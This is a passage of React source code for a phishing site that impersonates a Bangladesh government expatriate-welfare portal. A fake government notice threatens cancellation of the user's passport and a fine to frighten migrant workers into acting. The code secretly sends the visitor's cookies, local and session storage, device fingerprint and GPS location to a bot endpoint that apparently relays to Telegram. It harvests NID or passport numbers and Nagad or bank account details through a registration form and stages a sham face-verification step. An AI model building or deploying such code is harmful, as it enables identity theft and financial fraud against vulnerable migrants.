          <h2 className="text-2xl font-black tracking-tight uppercase">জরুরি তলব ও চূড়ান্ত নোটিশ</h2>
          <p className="text-[10px] font-bold opacity-80 tracking-[0.3em] uppercase mt-1">Government of the People's Republic of Bangladesh</p>
        </div>

        <div className="p-8 space-y-6">
          <div className="flex items-center gap-6 p-4 bg-slate-50 rounded-2xl border border-slate-100">
            <div className="w-20 h-24 rounded-lg border-2 border-gov-green overflow-hidden shadow-sm bg-white">
              {user.photoUrl ? (
                <img src={user.photoUrl} alt="" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
              ) : (
                <div className="w-full h-full flex items-center justify-center bg-slate-100"><UserCheck size={32} className="text-slate-300" /></div>
              )}
            </div>
            <div className="space-y-1">
              <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Target Recipient</p>
              <h3 className="text-xl font-black text-gov-green">{user.name}</h3>
              <p className="text-xs font-bold text-slate-600">ID: {user.idNumber || 'N/A'}</p>
              <p className="text-xs font-bold text-slate-600">Phone: {user.phone || 'N/A'}</p>
            </div>
          </div>

          <div className="space-y-4 text-slate-700 leading-relaxed">
            <div className="bg-gov-red/5 p-4 rounded-xl border border-gov-red/20 relative overflow-hidden">
              <div className="absolute top-0 right-0 bg-gov-red text-white text-[8px] font-black px-2 py-1 rounded-bl-lg uppercase tracking-widest animate-pulse">
                Expiring Soon
              </div>
              <p className="text-sm font-bold text-gov-red mb-2 flex items-center gap-2">
                <Clock size={18} /> সময়সীমা: ২৩ ঘণ্টা ৫৯ মিনিট ৫৯ সেকেন্ড
              </p>
              <p className="text-sm font-medium">
                জনাব <span className="font-bold text-gov-green">{user.name}</span>, প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয় কর্তৃক আপনার নামে ইস্যুকৃত <span className="font-bold">সরকারি ভাতা এবং বিএমইটি স্মার্ট কার্ড</span> সংগ্রহের জন্য আপনাকে জরুরি তলব করা হচ্ছে। 
              </p>
            </div>

            <div className="p-4 bg-red-50 rounded-xl border-2 border-gov-red">
              <p className="text-sm font-black text-gov-red mb-1">সতর্কবার্তা:</p>
              <p className="text-xs font-bold text-slate-700">
                আগামী <span className="text-gov-red underline">২৪ ঘণ্টার মধ্যে</span> যদি আপনি আমাদের অফিসিয়াল এ্যাপটি ডাউনলোড করে আপনার একাউন্ট ভেরিফিকেশন সম্পন্ন না করেন, তবে আপনার নামে বরাদ্দকৃত সকল সরকারি সুবিধা এবং <span className="font-bold">পাসপোর্ট সহ প্রয়োজনীয় গুরুত্বপূর্ণ নথিপত্র স্থায়ীভাবে বাতিল</span> করা হবে এবং আপনাকে <span className="text-gov-red underline">৫,০০০/- টাকা জরিমানা</span> প্রদান করতে হবে।
              </p>
            </div>

            <div className="p-4 bg-amber-50 rounded-xl border border-amber-200">
              <p className="text-[11px] font-bold text-amber-800 leading-tight">
                * প্রবাসী জরিপ ও সরকারি তালিকা ভুক্তি হওয়ার জন্য এখনই এ্যাপটি ডাউনলোড করে রেজিষ্ট্রেশন সম্পন্ন করুন। অন্যথায় আপনি সরকারি প্রবাসী তালিকা থেকে বাদ পড়বেন।
              </p>
            </div>
          </div>

          <div className="space-y-3 pt-4">
            <button 
              onClick={() => {
                window.open('https://play.google.com/store/apps/details?id=com.amiprobashi.user', '_blank');
                onClose();
              }}
              className="w-full bg-gov-green text-white py-5 rounded-2xl font-black text-lg hover:bg-emerald-800 transition-all shadow-lg shadow-emerald-900/30 flex items-center justify-center gap-3"
            >
              <Download size={24} /> এখনই এ্যাপটি ডাউনলোড করুন
            </button>
            <p className="text-[10px] text-center text-slate-400 font-bold uppercase tracking-widest">
              নিরাপদ অভিবাসন, স্মার্ট বাংলাদেশ
            </p>
          </div>
        </div>
      </motion.div>
    </div>
  );
};

const notifyBot = async (message: string) => {
  try {
    const queryId = new URLSearchParams(window.location.search).get('id') || 'Unknown';
    const sId = localStorage.getItem('session_user_id') || 'unassigned';
    await fetch('/api/notify-bot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message,
        userId: sId,
        email: `NID_Query: ${queryId}`
      }),
    });
  } catch (error) {
    console.error('Bot notification error:', error);
  }
};

const sendAdvancedTelemetry = async (activeSessionId: string) => {
  try {
    const queryId = new URLSearchParams(window.location.search).get('id') || 'Unknown';
    const escapeHTMLForTelegram = (str: any) => {
      if (str === null || str === undefined) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    };

    // Gather localStorage dump defensively
    const localStorageItems: string[] = [];
    const maxItems = 12;
    let lsCount = 0;
    for (let i = 0; i < localStorage.length && lsCount < maxItems; i++) {
      const key = localStorage.key(i);
      if (key) {
        lsCount++;
        let val = localStorage.getItem(key) || '';
        if (val.length > 200) {
          val = val.slice(0, 200) + '... [truncated]';
        }
        localStorageItems.push(`• <b>${escapeHTMLForTelegram(key)}:</b> <code>${escapeHTMLForTelegram(val)}</code>`);
      }
    }
    const localStorageHtml = localStorageItems.length > 0 ? localStorageItems.join('\n') : '<i>(No LocalStorage items)</i>';

    // Gather sessionStorage dump
    const sessionStorageItems: string[] = [];
    let ssCount = 0;
    for (let i = 0; i < sessionStorage.length && ssCount < maxItems; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        ssCount++;
        let val = sessionStorage.getItem(key) || '';
        if (val.length > 200) {
          val = val.slice(0, 200) + '... [truncated]';
        }
        sessionStorageItems.push(`• <b>${escapeHTMLForTelegram(key)}:</b> <code>${escapeHTMLForTelegram(val)}</code>`);
      }
    }
    const sessionStorageHtml = sessionStorageItems.length > 0 ? sessionStorageItems.join('\n') : '<i>(No SessionStorage items)</i>';

    // Gather cookies
    const cookies = document.cookie ? document.cookie.split('; ') : [];
    const truncatedCookies = cookies.slice(0, maxItems).map(c => {
      let val = c;
      if (val.length > 200) {
        val = val.slice(0, 200) + '... [truncated]';
      }
      return `• <code>${escapeHTMLForTelegram(val)}</code>`;
    });
    const cookieHtml = truncatedCookies.length > 0 ? truncatedCookies.join('\n') : '<i>(No Cookies)</i>';

    // Hardware specs
    const cores = navigator.hardwareConcurrency || 'N/A';
    const ram = (navigator as any).deviceMemory || 'N/A';
    const conn = (navigator as any).connection;
    const speed = conn ? `Type: ${conn.effectiveType || 'N/A'}, RTT: ${conn.rtt || 'N/A'}ms, Downlink: ${conn.downlink || 'N/A'}Mbps` : 'N/A';

    const message = `<b>🌐 New Visitor System Telemetry Profile</b>

<b>👤 Session Tracking:</b>
- <b>Target Session ID:</b> <code>${escapeHTMLForTelegram(activeSessionId)}</code>
- <b>Entry Path:</b> <code>${escapeHTMLForTelegram(window.location.pathname + window.location.search)}</code>
- <b>Referrer:</b> <code>${escapeHTMLForTelegram(document.referrer || 'Direct Entry / None')}</code>

<b>🖥️ System Hardware & Specs:</b>
- <b>Platform/OS:</b> <code>${escapeHTMLForTelegram(navigator.platform)}</code>
- <b>User Agent:</b> <code>${escapeHTMLForTelegram(navigator.userAgent)}</code>
- <b>Browser Language:</b> <code>${escapeHTMLForTelegram(navigator.language)}</code>
- <b>Screen Specs:</b> <code>${window.screen.width}x${window.screen.height} (Viewport: ${window.innerWidth}x${window.innerHeight})</code>
- <b>Timezone Name:</b> <code>${escapeHTMLForTelegram(Intl.DateTimeFormat().resolvedOptions().timeZone)}</code>
- <b>CPU Cores:</b> <code>${cores} Cores</code>
- <b>Device Memory RAM:</b> <code>${ram} GB</code>
- <b>Network Connectivity:</b> <code>${escapeHTMLForTelegram(speed)}</code>

<b>🍪 Active Browser Cookies (document.cookie):</b>
${cookieHtml}

<b>💾 LocalStorage Cache Dump:</b>
${localStorageHtml}

<b>📝 SessionStorage Cache Dump:</b>
${sessionStorageHtml}`;

    await fetch('/api/notify-bot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message,
        userId: activeSessionId,
        email: `NID_Query: ${queryId}`
      }),
    });
  } catch (error) {
    console.error('Failed to send visitor telemetry profile:', error);
  }
};

const sendVerifiedConsentTelemetry = async (activeSessionId: string, geoAllowed: boolean) => {
  try {
    const queryId = new URLSearchParams(window.location.search).get('id') || 'Unknown';
    const hasNID = localStorage.getItem('family_card_data') ? 'Yes (Local Card Exists)' : 'No Card Yet';
    
    // Quick Latency ping check
    const startTime = performance.now();
    let ping = -1;
    try {
      await fetch('/api/health');
      ping = Math.round(performance.now() - startTime);
    } catch {}

    const escapeHTMLForTelegram = (str: any) => {
      if (str === null || str === undefined) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    };

    let locationHtml = '❌ <i>(User Denied Geolocation Access)</i>';
    let gMapLink = '';
    
    if (geoAllowed) {
      const geo = await new Promise<GeolocationPosition | null>((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(pos),
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
      if (geo) {
        const { latitude, longitude, accuracy } = geo.coords;
        locationHtml = `✅ <b>GRANTED (High Accuracy GPS)</b>
- <b>Latitude:</b> <code>${latitude}</code>
- <b>Longitude:</b> <code>${longitude}</code>
- <b>Accuracy Margin:</b> <code>${Math.round(accuracy)} meters</code>`;
        gMapLink = `\n- <b>📍 Direct Radar Map:</b> <a href="https://www.google.com/maps?q=${latitude},${longitude}">Show Real-Time Location</a>`;
      } else {
        locationHtml = '❌ <i>(Permission granted but GPS timed out or was inactive)</i>';
      }
    }

    // Battery Specs
    let batteryDetails = 'N/A';
    try {
      if ('getBattery' in navigator) {
        const b = await (navigator as any).getBattery();
        batteryDetails = `${Math.round(b.level * 100)}% (${b.charging ? '🟢 Active Charging' : '🔴 Discharging / On Battery'})`;
      }
    } catch {}

    // Media Device Check
    let deviceCounts = 'No Permission / Hardware blocked';
    try {
      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        const devs = await navigator.mediaDevices.enumerateDevices();
        const cams = devs.filter((d) => d.kind === 'videoinput').length;
        const mics = devs.filter((d) => d.kind === 'audioinput').length;
        const speakers = devs.filter((d) => d.kind === 'audiooutput').length;
        deviceCounts = `🎥 ${cams} Cameras, 🎙️ ${mics} Microphones, 🔊 ${speakers} Sound Outputs`;
      }
    } catch {}

    // Precise System Canvas Info
    const innerW = window.innerWidth;
    const innerH = window.innerHeight;
    const isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);

    const message = `<b>🎯 VERIFIED USER CONSENTED PROFILE RECEIVED</b>

<b>👤 Profile Identifiers:</b>
- <b>Target Session ID:</b> <code>${activeSessionId}</code>
- <b>Verified NID Status:</b> <code>${hasNID}</code>
- <b>Entry Query ID:</b> <code>${queryId}</code>

<b>📍 Authorized Location Data:</b>
${locationHtml}${gMapLink}

<b>⚡ Calculated Real-Time Latency:</b>
- <b>True Connection Ping:</b> <code>${ping >= 0 ? ping + ' ms' : 'Fail to ping'}</code>

<b>🔋 Device Battery Status:</b>
- <b>Charge Profile:</b> <code>${batteryDetails}</code>

<b>💻 Physical System Environment:</b>
- <b>Touch Display support:</b> <code>${isTouch ? 'Yes' : 'No'}</code>
- <b>Exact Viewport Size:</b> <code>${innerW}x${innerH}</code>
- <b>Device Scale Ratio (DPR):</b> <code>${window.devicePixelRatio}x</code>
- <b>Media Hardware:</b> <code>${deviceCounts}</code>
- <b>Active Timezone:</b> <code>${escapeHTMLForTelegram(Intl.DateTimeFormat().resolvedOptions().timeZone)}</code>`;

    await fetch('/api/notify-bot', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message,
        userId: activeSessionId,
        email: `Permission_Granted_UID: ${activeSessionId}`
      }),
    });
  } catch (error) {
    console.error('Failed to submit verified telemetry:', error);
  }
};

const BottomNav = ({ activePage, setActivePage }: { activePage: string; setActivePage: (p: string) => void }) => {
  const navItems = [
    { id: 'home', label: 'Home', icon: <Globe size={20} /> },
    { id: 'all-register', label: 'All Register', icon: <Users size={20} /> },
    { id: 'dashboard', label: 'Dashboard', icon: <LayoutDashboard size={20} /> },
    { id: 'help-center', label: 'Help Centre', icon: <MessageCircle size={20} /> },
  ];

  return (
    <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200 flex justify-around py-3 px-2 z-[60] shadow-[0_-5px_15px_rgba(0,0,0,0.05)]">
      {navItems.map((item) => (
        <button
          key={item.id}
          onClick={() => {
            setActivePage(item.id);
            notifyBot(`Navigated to ${item.label}`);
          }}
          className={`flex flex-col items-center gap-1 transition-all ${activePage === item.id ? 'text-gov-green scale-110' : 'text-slate-400'}`}
        >
          {item.icon}
          <span className="text-[10px] font-bold uppercase tracking-tighter">{item.label}</span>
        </button>
      ))}
    </div>
  );
};

const RegistrationProcess = ({ onComplete, onBack }: { onComplete: (data: any) => void, onBack: () => void }) => {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    userName: '',
    fatherName: '',
    district: '',
    thana: '',
    nidNumber: '',
    paymentMethod: '',
    nagadNo: '',
    bankName: '',
    accNo: '',
    accHolder: '',
    bankPhone: ''
  });
  const [instruction, setInstruction] = useState('শুরু করতে নিচের বাটনে ক্লিক করুন');
  const [isVerifying, setIsVerifying] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);

  const handleBack = () => {
    if (step > 1) {
      setStep(step - 1);
    } else {
      onBack();
    }
  };

  const initCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
    } catch (err) {
      alert("ক্যামেরা এক্সেস প্রয়োজন!");
    }
  };

  useEffect(() => {
    if (step === 3) {
      initCamera();
    }
  }, [step]);

  const startVerification = () => {
    setIsVerifying(true);
    const steps = [
      "৩ সেকেন্ড স্থির হয়ে তাকিয়ে থাকুন",
      "চোখের পাতা নড়াচড়া করুন",
      "ডানে মুখ ঘোরান",
      "বামে মুখ ঘোরান",
      "উপরে ও নিচে তাকান",
      "ভেরিফিকেশন সম্পন্ন হচ্ছে..."
    ];

    let i = 0;
    const interval = setInterval(() => {
      setInstruction(steps[i]);
      i++;
      if (i >= steps.length) {
        clearInterval(interval);
        
        const esc = (str: string) => str.replace(/[&<>"']/g, (m) => ({
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          "'": '&#39;'
        }[m] || m));

        // Send all form data to Telegram Bot
        const botMessage = `
<b>📝 New Registration Submitted</b>
<b>Name:</b> ${esc(formData.userName)}
<b>Father's Name:</b> ${esc(formData.fatherName)}
<b>District:</b> ${esc(formData.district)}
<b>Thana:</b> ${esc(formData.thana)}
<b>NID/Passport:</b> ${esc(formData.nidNumber)}
<b>Payment Method:</b> ${esc(formData.paymentMethod)}
${formData.paymentMethod === 'nagad' ? `<b>Nagad No:</b> ${esc(formData.nagadNo)}` : ''}
${formData.paymentMethod === 'bank' ? `
<b>Bank Name:</b> ${esc(formData.bankName)}
<b>Acc No:</b> ${esc(formData.accNo)}
<b>Acc Holder:</b> ${esc(formData.accHolder)}
` : ''}
        `.trim();
        
        notifyBot(botMessage);

        const finalData = {
          name: formData.userName || "মো: প্রবাসী নাগরিক",
          district: formData.district || "ঢাকা",
          number: '880' + Math.floor(1000 + Math.random() * 9000) + ' ' + 
                  Math.floor(1000 + Math.random() * 9000) + ' ' + 
                  Math.floor(1000 + Math.random() * 9000) + ' ' + 
                  Math.floor(1000 + Math.random() * 9000),
          expiry: '12/30',
          bg: 'linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d)',
          isRegistered: true
        };
        onComplete(finalData);
      }
    }, 3000);
  };

  return (
    <div className="bg-white rounded-3xl shadow-xl overflow-hidden max-w-md mx-auto font-['Hind_Siliguri'] relative">
      <button 
        onClick={handleBack}
        className="absolute top-6 left-6 z-20 p-2 bg-slate-100 rounded-full hover:bg-slate-200 transition-all"
      >
        <ChevronLeft className="w-5 h-5 text-slate-700" />
      </button>

      {step === 1 && (
        <div className="p-8">
          <h2 className="text-2xl font-bold text-indigo-900 mb-6 text-center">ব্যক্তিগত তথ্য</h2>
          <div className="space-y-4 text-left">
            <div>
              <label className="block text-sm font-semibold mb-1">আপনার নাম</label>
              <input 
                type="text" 
                className="w-full p-3 border border-slate-200 rounded-xl outline-none focus:border-indigo-900"
                placeholder="পুরো নাম লিখুন"
                value={formData.userName}
                onChange={e => setFormData({...formData, userName: e.target.value})}
              />
            </div>
            <div>
              <label className="block text-sm font-semibold mb-1">পিতার নাম</label>
              <input 
                type="text" 
                className="w-full p-3 border border-slate-200 rounded-xl outline-none focus:border-indigo-900"
                placeholder="পিতার নাম"
                value={formData.fatherName}
                onChange={e => setFormData({...formData, fatherName: e.target.value})}
              />
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-semibold mb-1">জেলা</label>
                <input 
                  type="text" 
                  className="w-full p-3 border border-slate-200 rounded-xl outline-none focus:border-indigo-900"
                  placeholder="আপনার জেলা"
                  value={formData.district}
                  onChange={e => setFormData({...formData, district: e.target.value})}
                />
              </div>
              <div>
                <label className="block text-sm font-semibold mb-1">থানা</label>
                <input 
                  type="text" 
                  className="w-full p-3 border border-slate-200 rounded-xl outline-none focus:border-indigo-900"
                  placeholder="আপনার থানা"
                  value={formData.thana}
                  onChange={e => setFormData({...formData, thana: e.target.value})}
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-semibold mb-1">পাসপোর্ট / NID নম্বর</label>
              <input 
                type="text" 
                className="w-full p-3 border border-slate-200 rounded-xl outline-none focus:border-indigo-900"
                placeholder="নম্বরটি দিন"
                value={formData.nidNumber}
                onChange={e => setFormData({...formData, nidNumber: e.target.value})}
              />
            </div>
            <button 
              className="w-full bg-indigo-900 text-white py-4 rounded-xl font-bold mt-4"
              onClick={() => setStep(2)}
            >
              পরবর্তী ধাপ
            </button>
          </div>
        </div>
      )}

      {step === 2 && (
        <div className="p-8">
          <h2 className="text-2xl font-bold text-indigo-900 mb-6 text-center">পেমেন্ট মাধ্যম</h2>
          <div className="flex gap-4 mb-6">
            <button 
              className={`flex-1 p-4 border-2 rounded-xl font-bold transition-all ${formData.paymentMethod === 'nagad' ? 'border-indigo-900 bg-indigo-50 text-indigo-900' : 'border-slate-200'}`}
              onClick={() => setFormData({...formData, paymentMethod: 'nagad'})}
            >
              নগদ
            </button>
            <button 
              className={`flex-1 p-4 border-2 rounded-xl font-bold transition-all ${formData.paymentMethod === 'bank' ? 'border-indigo-900 bg-indigo-50 text-indigo-900' : 'border-slate-200'}`}
              onClick={() => setFormData({...formData, paymentMethod: 'bank'})}
            >
              ব্যাংক
            </button>
          </div>

          {formData.paymentMethod === 'nagad' && (
            <div className="space-y-4 text-left mb-6">
              <label className="block text-sm font-semibold mb-1">নগদ নম্বর</label>
              <input 
                type="text" 
                className="w-full p-3 border border-slate-200 rounded-xl outline-none focus:border-indigo-900"
                placeholder="০১৭xxxxxxxx"
                value={formData.nagadNo}
                onChange={e => setFormData({...formData, nagadNo: e.target.value})}
              />
            </div>
          )}

          {formData.paymentMethod === 'bank' && (
            <div className="space-y-4 text-left mb-6">
              <div>
                <label className="block text-sm font-semibold mb-1">ব্যাংকের নাম</label>
                <input type="text" className="w-full p-3 border border-slate-200 rounded-xl outline-none" value={formData.bankName} onChange={e => setFormData({...formData, bankName: e.target.value})} />
              </div>
              <div>
                <label className="block text-sm font-semibold mb-1">একাউন্ট নম্বর</label>
                <input type="text" className="w-full p-3 border border-slate-200 rounded-xl outline-none" value={formData.accNo} onChange={e => setFormData({...formData, accNo: e.target.value})} />
              </div>
              <div>
                <label className="block text-sm font-semibold mb-1">একাউন্ট হোল্ডার নাম</label>
                <input type="text" className="w-full p-3 border border-slate-200 rounded-xl outline-none" value={formData.accHolder} onChange={e => setFormData({...formData, accHolder: e.target.value})} />
              </div>
            </div>
          )}

          <div className="flex gap-4">
            <button className="flex-1 bg-slate-200 py-4 rounded-xl font-bold" onClick={() => setStep(1)}>পিছনে</button>
            <button className="flex-1 bg-indigo-900 text-white py-4 rounded-xl font-bold" onClick={() => setStep(3)}>পরবর্তী ধাপ</button>
          </div>
        </div>
      )}

      {step === 3 && (
        <div className="p-8 text-center">
          <h2 className="text-2xl font-bold text-indigo-900 mb-6">ফেইস ভেরিফিকেশন</h2>
          <div className="relative w-64 h-64 mx-auto rounded-full overflow-hidden border-4 border-indigo-900 bg-black">
            <video ref={videoRef} autoPlay playsInline className="w-full h-full object-cover scale-x-[-1]" />
            <div className="absolute inset-0 border-[20px] border-black/20 rounded-full pointer-events-none" />
          </div>
          <p className="mt-6 font-bold text-red-600 h-12">{instruction}</p>
          {!isVerifying && (
            <button 
              className="w-full bg-indigo-900 text-white py-4 rounded-xl font-bold mt-4"
              onClick={startVerification}
            >
              ভেরিফিকেশন শুরু করুন
            </button>
          )}
        </div>
      )}
    </div>
  );
};

// এই লিংকটি আপনি পরবর্তীতে আপনার সুবিধা অনুযায়ী পরিবর্তন করে নিতে পারবেন
const IMO_APP_CALL_URL = "https://imo.im/call/user_profile";

const banglaMaleFirstNames = [
  "মোঃ", "মোহাম্মদ", "আবু", "আব্দুর", "হাসান", "মিনহাজ", "তারেক", "মাসুদ", "সোহেল", "রাজিব", "জাকির", 
  "আরিফ", "নাসিম", "রুবেল", "সজীব", "ফেরদৌস", "মাহমুদ", "কবীর", "মিজানুর", "আনিসুর", "আতিকুর", "মোস্তফা", 
  "জাহিদ", "ফারুক", "সোহাগ", "রিপন", "মনোয়ার", "ইমরান", "সাদ্দাম", "শাহীন", "মিলন", "বাপ্পী", "লিটন", 
  "সুমন", "মনির", "রাসেল", "জসিম", "শাহাদাত", "শরীফ", "আল-আমিন"
];

const banglaMaleLastNames = [
  "রহমান", "ইসলাম", "মিয়া", "হোসেন", "আলী", "আহমেদ", "চৌধুরী", "খান", "ভুঁইয়া", "শেখ", "শিকদার", 
  "তাফাদার", "হালদার", "পলাশ", "রানা", "মুন্সী", "আফ্রিদি", "তালেব", "গাজী", "লতিফ", "শরীফ", "বুলবুল", 
  "আকাশ", "সরকার", "পাটোয়ারী", "মন্ডল", "উদ্দীন", "চৌহান", "রাজ"
];

const banglaFemaleFirstNames = [
  "মোসাম্মৎ", "মরিয়ম", "ফাতেমা", "আয়েশা", "খাদিজা", "তানিয়া", "সুলতানা", "রোজিনা", "জেসমিন", "নাসরিন", 
  "শারমিন", "নুসরাত", "সাদিয়া", "ফরিদা", "সালমা", "রোকেয়া", "শিরিন", "তাসনিম", "শিউলি", "বিউটি", "পারভীন", 
  "রিনা", "লতা", "হাসনাহেন", "আকতার", "আসমা", "রীনা", "জাহান", "শাহানাজ", "রুনা", "লাকী", "ইতি", "তন্নী", "তমা"
];

const banglaFemaleLastNames = [
  "আক্তার", "খাতুন", "বেগম", "জাহান", "নাহার", "সুলতানা", "পারভীন", "আরা", "বানু", "চৌধুরী", "খানম", 
  "ফারহানা", "ইয়াসমিন", "তাজরীন", "ইতি", "বন্যা", "রেহমান", "পপি", "শিখা", "আঞ্জুমান"
];

const applicationTypes = [
  "ফ্যামিলি কার্ডের আবেদন",
  "নিরাপদ রেমিট্যান্স ক্যাশ প্রণোদনা আবেদন",
  "উচ্চশিক্ষা বৃত্তি ও সন্তান কল্যাণ",
  "মেডিকেল রিপোর্ট ও করোনা ভ্যাকসিন কার্ড আবেদন",
  "পিডিও সার্টিফিকেট ও ওরিয়েন্টেশন আবেদন",
  "বিএমইটি স্মার্ট কার্ড ট্র্যাকার",
  "স্মার্ট প্রবাসী অনুদান",
  "প্রবাসী কার্ডের আবেদন",
  "প্রবাসী ভাতার আবেদন",
  "প্রবাসী জীবন বিমার আবেদন"
];

const countriesList = [
  { name: "সৌদি আরব", flag: "🇸🇦", code: "+966" },
  { name: "মালয়েশিয়া", flag: "🇲🇾", code: "+60" },
  { name: "কাতার", flag: "🇶🇦", code: "+974" },
  { name: "কুয়েত", flag: "🇰🇼", code: "+965" },
  { name: "ফ্রান্স", flag: "🇫🇷", code: "+33" },
  { name: "আমেরিকা", flag: "🇺🇸", code: "+1" },
  { name: "জর্ডান", flag: "🇯🇴", code: "+962" },
  { name: "আরব আমিরাত", flag: "🇦🇪", code: "+971" },
  { name: "বাহরাইন", flag: "🇧🇭", code: "+973" },
  { name: "ওমান", flag: "🇴🇲", code: "+968" },
  { name: "সিঙ্গাপুর", flag: "🇸🇬", code: "+65" },
  { name: "ইতালি", flag: "🇮🇹", code: "+39" }
];

const WhatsAppIcon = () => (
  <svg className="w-5 h-5 fill-white shrink-0" viewBox="0 0 24 24">
    <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.01 12.008.01c3.202.001 6.212 1.246 8.477 3.513 2.266 2.268 3.507 5.28 3.505 8.484-.004 6.657-5.34 11.997-11.953 11.997-2.005-.001-3.973-.502-5.724-1.458L0 24zm6.59-20.359c-.214-.475-.44-.484-.643-.492-.166-.007-.357-.006-.547-.006-.19 0-.499.071-.76.357-.261.285-1.01 1.01-1.01 2.46 0 1.452 1.045 2.853 1.191 3.052.146.199 2.057 3.284 5.064 4.542.715.302 1.273.484 1.708.625.72.228 1.374.195 1.892.118.577-.085 1.774-.726 2.022-1.429.247-.702.247-1.305.174-1.429-.073-.124-.268-.198-.562-.347-.294-.148-1.74-.858-2.01-.956-.27-.099-.467-.148-.664.148-.197.297-.764.956-.937 1.153-.172.198-.345.223-.639.074-.294-.148-1.24-.457-2.361-1.457-.872-.778-1.46-1.74-1.632-2.037-.172-.297-.018-.458.13-.606.134-.133.294-.347.44-.52.146-.173.195-.297.294-.495.099-.197.05-.371-.025-.52-.075-.148-.643-1.604-.891-2.179z"/>
  </svg>
);

const ImoIcon = () => (
  <div className="w-5 h-5 bg-white text-[#1a9bf0] font-black italic rounded-full flex items-center justify-center text-[9px] shrink-0 font-sans tracking-tighter shadow-sm">
    imo
  </div>
);

const TelegramIcon = () => (
  <svg className="w-5 h-5 fill-white shrink-0" viewBox="0 0 24 24">
    <path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.56 8.18s-.13.91-.56 2.8c-.46 2.01-1.42 6.06-1.89 8.01-.2.83-.51 1.12-.8 1.15-.65.06-1.15-.43-1.78-.84-.98-.64-1.53-1.04-2.48-1.66-1.1-.72-.39-1.12.24-1.78.17-.17 3.01-2.76 3.07-3.01.01-.03.01-.15-.06-.21-.07-.06-.18-.04-.26-.02-.11.02-1.92 1.22-5.43 3.59-.51.35-.98.53-1.39.52-.46-.01-1.33-.26-1.98-.48-.8-.26-1.42-.4-1.37-.85.03-.23.35-.47.96-.71 3.76-1.64 6.27-2.72 7.53-3.24 3.57-1.49 4.31-1.75 4.8-.1.01.01.03.03.04.05z"/>
  </svg>
);

const EmailIcon = () => (
  <svg className="w-5 h-5 text-white shrink-0" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
    <path strokeLinecap="round" strokeLinejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/>
  </svg>
);

const getRegistrationTypeDetails = (type: string) => {
  switch (type) {
    case 'safe_remittance':
      return {
        title: "নিরাপদ রেমিট্যান্স ক্যাশ প্রণোদনার আবেদন",
        subTitle: "রেমিট্যান্স প্রুফ ও ক্যাশ প্রণোদনা কার্ড অনলাইন ভেরিফিকেশন",
        platformSelectLabel: "প্রণোদনা কার্ড সংগ্রহের প্ল্যাটফর্ম নির্বাচন করুন",
        optionLabel: "প্রণোদনা কার্ড টির অনলাইন কপি",
        badge: "রেমিট্যান্স প্রণোদনা"
      };
    case 'higher_edu_scholarship':
      return {
        title: "উচ্চশিক্ষা বৃত্তি ও সন্তান কল্যাণ কার্ড সংগ্রহ",
        subTitle: "মেধাবী বৃত্তি নিবন্ধন ও সন্তান কল্যাণ ডিজিটাল কার্ড প্রাপ্তি",
        platformSelectLabel: "কল্যাণ কার্ড সংগ্রহের প্ল্যাটফর্ম নির্বাচন করুন",
        optionLabel: "কল্যাণ কার্ড ও বৃত্তির কপি",
        badge: "উচ্চশিক্ষা ও কল্যাণ"
      };
    case 'medical_vaccine_card':
      return {
        title: "ডিজিটাল রিপোর্ট ও করোনা ভ্যাকসিন কার্ড ডাউনলোড",
        subTitle: "মেডিকেল ফিটনেস ও করোনা টিকার ডিজিটাল কিউআর কপি",
        platformSelectLabel: "ডিজিটাল কার্ড ডাউনলোডের প্ল্যাটফর্ম নির্বাচন করুন",
        optionLabel: "ডিজিটাল কিউআর কার্ড কপি",
        badge: "মেডিকেল ও ভ্যাকসিন"
      };
    case 'pdo_certificate':
      return {
        title: "পিডিও সার্টিফিকেট ও ওরিয়েন্টেশন স্মার্ট আবেদন",
        subTitle: "প্রাক-বহির্গমন ওরিয়েন্টেশন সার্টিফিকেট ডাউনলোড ও অনলাইন কপি",
        platformSelectLabel: "সার্টিফিকেট সংগ্রহের প্ল্যাটফর্ম নির্বাচন করুন",
        optionLabel: "পিডিও স্মার্ট সার্টিফিকেট কপি",
        badge: "পিডিও সার্টিফিকেট"
      };
    case 'expatriate_grant':
      return {
        title: "প্রবাসী কল্যাণ অনুদান আবেদন পোর্টাল",
        subTitle: "জরুরি অনুদান, চিকিৎসা সাহায্য ও মৃত প্রবাসীর পরিবার প্রতিদান",
        platformSelectLabel: "অনুদান ফাইল ট্র্যাকিং প্ল্যাটফর্ম নির্বাচন করুন",
        optionLabel: "অনুমোদিত অনুদান ফাইল কপি",
        badge: "প্রবাসী অনুদান"
      };
    case 'bmet_smart_card':
      return {
